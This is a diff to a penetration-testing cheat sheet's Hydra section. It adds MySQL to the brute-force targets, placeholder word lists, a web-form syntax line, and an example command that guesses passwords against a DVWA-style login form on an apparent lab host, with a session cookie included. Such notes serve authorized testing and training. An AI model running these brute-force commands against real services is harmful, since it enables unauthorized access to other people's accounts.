@@ -57,14 +57,20 @@ SecLists (`/usr/share/seclists/Discovery/Web-Content/`):
 
 ### 2.5. Brute force (Hydra)
 
-#### RDP/SSH/FTP/SMB
+#### RDP/SSH/FTP/SMB/MySQL
 
 |   |   |
 |---|---|
-|Specify username|`hydra -l $USERNAME -P passwords.txt $TARGET <rdp/ssh/ftp/smb>`|
-|Use username list|`hydra -L usernames.txt -P passwords.txt $TARGET <rdp/ssh/ftp/smb>`|
+|Specify username|`hydra -l $USERNAME -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|
+|Use username list|`hydra -L $USERNAME_LIST -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|
 
 #### Web
+
+Syntax:
+
+`hydra` `-l $USERNAME`/`-L $USERNAME_LIST` `-P $PASSWORD_LIST` `$TARGET` `http-get-form`/`http-post-form` `$PATH`:`$REQUEST_BODY`:`F=$FAILURE_VERBIAGE`/`S=$SUCCESS_VERBIAGE`
+
+Examples:
 
 ```console
 hydra -l admin -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
